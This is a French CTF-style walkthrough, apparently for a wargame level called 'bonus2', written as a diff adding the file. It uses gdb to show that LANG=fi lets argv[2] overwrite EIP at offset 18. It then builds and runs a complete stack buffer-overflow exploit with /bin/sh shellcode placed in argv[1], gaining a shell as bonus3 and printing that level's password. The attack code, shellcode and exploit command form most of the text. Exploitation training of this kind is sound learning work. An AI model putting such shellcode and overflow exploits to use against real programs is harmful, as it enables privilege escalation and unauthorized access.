@@ -1,0 +1,82 @@
+BONUS 2
+-------
+
+1.	gdb bonus2
+
+2.	disas main
+
+Tout d'abord le programme prend 2 arguments minimum et maximum.
+// 0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
+
+Ensuite en faisant un info variables:
+// 0x08049988  language
+
+Il y a une variable globale language.
+
+Cette variable sera changée en fonction de l'env LANG.
+Si LANG=fi , language == 1
+Si LANG=nl , language == 2
+
+La variable language changera le message de sortie et dira
+"bonjour" en fonction de la langue choisie.
+Si LANG=fi, sortie = Hyvää päivää argv[1]
+Si LANG=nl, sortie = Goedemiddag! argv[1]
+Autre, sortie = Hello argv[1]
+
+
+La langue permet aussi de pouvoir overflow le programme.
+Lorsque l'on ne modifie pas la langue et qu'on lance:
+
+run $(python -c 'print "A"*100') $(python -c 'print "B"*100')
+
+Le programme segfault bien mais l'adresse EIP est: 0x08004242
+On voit bien que même si on met 1000 caractères en argv[2] l'EIP
+ne sera que partiellement modifié.
+
+Alors que si l'on modifie l'ENV:
+
+set environment LANG fi (sur gdb)
+export LANG=fi (sans gdb)
+
+Et qu'on relance la même commande:
+0x42424242 in ?? ()
+
+L'EIP a complètement été modifié.
+On trouve un offset de 18 après quelques tests.
+
+On sait maintenant que l'argv[2] modifie l'EIP.
+On sait aussi en arborant la programme qu'il n'y pas d'appel à system ou autre,
+donc il va falloir y intégrer notre shellcode:
+Shellcode		=	"\x31\xdb\x31\xd2\x31\xc9\x51\x68"
+					"\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+					"\x69\x89\xe3\x31\xc0\xb0\x0b\x83"
+					"\xe4\xf0\xcd\x80"
+
+Nous allons nous servir de l'argv[1] pour y intégrer notre shellcode.
+
+Pour cela il nous faut l'adresse de argv[1] dans la fonction greetuser():
+
+break greetuser
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $(python -c 'print "C"*18')
+x/50x $esp
+0xbffff650 ---> adresse de notre argv[1]
+
+Maintenant qu'on a notre adresse on va construire notre script.
+
+										AV[1]
+----adresse de départ du shellcode----SHELLCODE--------Caractères pour remplir les registres de fin-
+		"\x44\xf6\xff\xbf"       (se réferer en haut)					"A"*12'          
+
+									AV[2]
+---------------PAYLOAD-----------------------------EIP: Adresse de début de shellcode------
+
+./bonus2 $(python -c 'print "\x44\xf6\xff\xbf"+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"+"A"*12') $(python -c 'print "B"*18+"\x40\xf6\xff\xbf"')
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+La seule différence entre langue fi et nl au niveau de l'exploit est le payload.
+
+3.	su bonus3
+	71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
